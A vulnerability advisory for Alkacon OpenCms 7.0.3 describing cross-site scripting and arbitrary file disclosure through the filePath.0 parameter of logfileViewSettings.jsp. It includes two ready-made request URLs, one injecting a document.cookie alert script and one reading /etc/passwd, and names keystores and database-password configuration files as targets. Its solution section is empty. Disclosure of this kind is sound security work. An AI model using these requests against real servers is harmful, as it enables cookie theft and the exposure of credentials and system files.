Subject: Alkacon OpenCms logfileViewSettings.jsp XSS, file disclosure

Alkacon OpenCms logfileViewSettings.jsp XSS, file disclosure


Product: Alkacon OpenCms 
http://www.opencms.org/


OpenCms contains a vulnerability in the Logfile Viewer Settings function. Input to Parameter filePath.0 in page opencms/system/workplace/admin/workplace/logfileview/logfileViewSettings.jsp is not sufficiently validated and/or sanitized. This can be exploited as a cross-site scripting issue but also as a file access issue, which allows a disclosure of arbitrary files that are readable in the OS security context of the JSP container process. The resulting page even has a "Download" button, which facilitates retrieving binary files. Possible targeted files could be /etc/passwd, /proc pseudo-files, Java keystore, OpenCms configuration file (with database password), etc.

Only OpenCms users in administrator roles have access to the vulnerable URL, which partially reduces the severity of the file disclosure aspect.

Example 1 (XSS):
http://(target)/opencms/system/workplace/admin/workplace/logfileview/logfileViewSettings.jsp?
isLogfile.0=true&isLogfile.0.value=true&enabled.0=true&enabled.0.value=true
&ok=Ok&action=save
&closelink=%252Fopencms%252Fopencms%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Fworkplace%252Flogfileview
&elementname=undefined&page=page1&style=new
&path=%252Fworkplace%252Flogfileview%252FlogfileViewSettings
&elementindex=0&framename=admin_content&windowSize.0=8000&fileEncoding.0=UTF-8
&filePath.0=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E

Example 2 (retrieving /etc/passwd):
http://(target)/opencms/system/workplace/admin/workplace/logfileview/logfileViewSettings.jsp?
isLogfile.0=true&isLogfile.0.value=true&enabled.0=true&enabled.0.value=true
&ok=Ok&action=save
&closelink=%252Fopencms%252Fopencms%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Fworkplace%252Flogfileview
&elementname=undefined&page=page1&style=new
&path=%252Fworkplace%252Flogfileview%252FlogfileViewSettings
&elementindex=0&framename=admin_content&windowSize.0=8000&fileEncoding.0=UTF-8
&filePath.0=%2Fetc%2Fpasswd


The vulnerability has been identified in version 7.0.3. However, other versions may be also affected.


Solution:
